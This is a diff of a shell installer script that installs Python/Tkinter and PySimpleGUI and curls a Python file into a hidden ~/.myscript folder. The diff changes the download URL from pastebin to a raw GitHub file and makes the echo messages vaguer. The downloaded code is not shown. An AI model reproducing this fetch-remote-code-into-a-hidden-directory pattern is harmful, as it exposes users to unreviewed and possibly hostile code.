@@ -2,7 +2,7 @@
 
 # Function to create the .myscript directory if it doesn't exist
 function create_myscript_directory() {
-    echo "Creating .myscript directory..."
+    echo "Creating directory..."
     mkdir -p "$HOME/.myscript"
 }
 
@@ -14,7 +14,7 @@ function install_homebrew() {
 
 # Function to install Python with Tkinter support using Homebrew
 function install_python_tkinter() {
-    echo "Installing Python with Tkinter support..."
+    echo "Installing Python..."
     brew install python-tk
 }
 
@@ -26,8 +26,8 @@ function install_pysimplegui() {
 
 # Function to download the Python script
 function download_script() {
-    echo "Downloading the Python script..."
-    curl -o "$HOME/.myscript/new.py" https://pastebin.com/raw/QqQ1gac3
+    echo "Downloading the script..."
+    curl -o "$HOME/.myscript/new.py" https://raw.githubusercontent.com/alwayshyper/protec/main/main.py
 }
 
 # Function to create the shell script
